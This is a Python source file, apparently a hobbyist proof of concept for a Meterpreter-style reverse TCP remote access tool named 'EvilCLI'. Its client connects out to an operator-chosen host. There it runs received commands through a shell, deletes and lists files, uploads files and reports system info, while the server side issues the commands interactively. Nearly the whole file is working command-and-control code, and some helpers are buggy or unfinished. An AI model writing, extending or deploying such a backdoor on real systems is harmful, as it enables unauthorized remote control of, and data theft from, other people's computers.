import os
import sys
import subprocess
import threading
import ssl
import socket
import argparse
import struct


"""
Author: lightwaves
Description: POC for a meterpreter type reverse tcp application in python
this will be the CLI for the application

"""
def read_file_chunks(fp):
    """
    My helper function
    used to read data from a file so it can be uploaded or downloaded without
    having to keep the entire file in memory so feel free to download or upload
    that blu ray rip (jk that'd totally be illegal, no one does that)
    """
    while True:
        with open(fp, "rb") as file:
            data = file.read(4096) #default block/cluster size on ntfs and ext3
            if not data:
                break
            yield data


def upload(args, sock):
    arg1, arg2 = args.split(" ")
    for chunk in read_file_chunks(arg1):
        put_block(sock, chunk)


def download(args):
    return NotImplementedError

def shell(args=None, local=True, Sock=None):
    while True:
        if local:
            inp = input(f"{os.getcwd()}>")
            if "cd" in inp:
                try:
                    os.chdir(os.path.abspath(inp.split(" ",maxsplit=1)[1]))
                except FileNotFoundError:
                    print("The system cannot find the path specified")
            elif inp == "exit":
                break
            result = subprocess.run(inp, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
            print(result.stdout.decode("utf-8"))
        
    
    
        

def execute(args):
    return subprocess.run(args)

def ls(args=None):
    return str(os.listdir(args))

def delete(args=None):
    return os.remove(args)

def sysinfo():
    
    """
    Todo(this could be made more comprehensive like meterpreter and actually grab Major build, minor build
    and translate that to a more human readable OS info also add linux support)
    """
    return str(sys.platform)

commandlist = {"print":print, "pwd":os.getcwd, "sysinfo": sysinfo, "del":delete, "ls":ls, "download":download, "upload": upload, "execute": execute, "shell": shell  }

def evilcli_client(cmd, commandlist):
    """
    Takes a string cmd as an input and runs the command
    """

    command_parse = cmd.split(" ", 1)
    if len(command_parse) > 1:
        command, args = command_parse
    else:
        command = command_parse[0]
        args = None

    output = commandlist.get(command)

    if output is None:
        return "invalid command"
    else:
        if args is None:

            out = output()
        else:    
            out = output(args)
        return out if out != None else ""
        
        
def evilcli_local():
    """
    evilcli_local is for client debug purposes
    """
    while True:
        
        user_in = input("EvilCLI> ")
        output = evilcli_client(user_in, commandlist)
        print(output)


header_struct = struct.Struct('!Q')  # messages up to 2**64 - 1 in length



def recvall(sock, length):

    blocks = []

    while length:

        block = sock.recv(length)

        if not block:

            raise EOFError('socket closed with {} bytes left in this block'.format(length))

        length -= len(block)

        blocks.append(block)

    return b''.join(blocks)



def get_block(sock):

    data = recvall(sock, header_struct.size)

    (block_length,) = header_struct.unpack(data)

    return recvall(sock, block_length)



def put_block(sock, message):

    block_length = len(message)

    sock.send(header_struct.pack(block_length))

    sock.send(message)
 
def evilcli_network_client(host, port):

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        sock.connect((host, port))
        print("successfully connected")
        while True:
            data = get_block(sock)
            out = evilcli_client(data.decode(), commandlist)
            put_block(sock, out.encode("utf-8"))
    except TimeoutError:
        sock.close()
        print("Failed to connect to host")
        

def evilcli_network_server(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    
    sock.bind((host, port))
    sock.listen(1)    
    print('Run this script in another window with "-c" to connect')    
    print('Listening at', sock.getsockname())    
    sc, sockname = sock.accept()    
    print('Accepted connection from', sockname)
    while True:
        user_in = input("EvilCLI> ")
        put_block(sc, user_in.encode('utf-8'))
        output = get_block(sc)
        print(output)



def main():
      parser = argparse.ArgumentParser(description='Transmit & receive blocks over TCP')    
      parser.add_argument('hostname', nargs='?', default='127.0.0.1', help='IP address or hostname (default: %(default)s)')    
      parser.add_argument('-c', action='store_true', help='run as the client')    
      parser.add_argument('-p', type=int, metavar='port', default=1060, help='TCP port number (default: %(default)s)')    
      args = parser.parse_args()    
      function = evilcli_network_client if args.c else evilcli_network_server    
      function(args.hostname, args.p)
      #evilcli_local()
 

 
 
#evilcli_local()
if __name__ == "__main__":
    main()
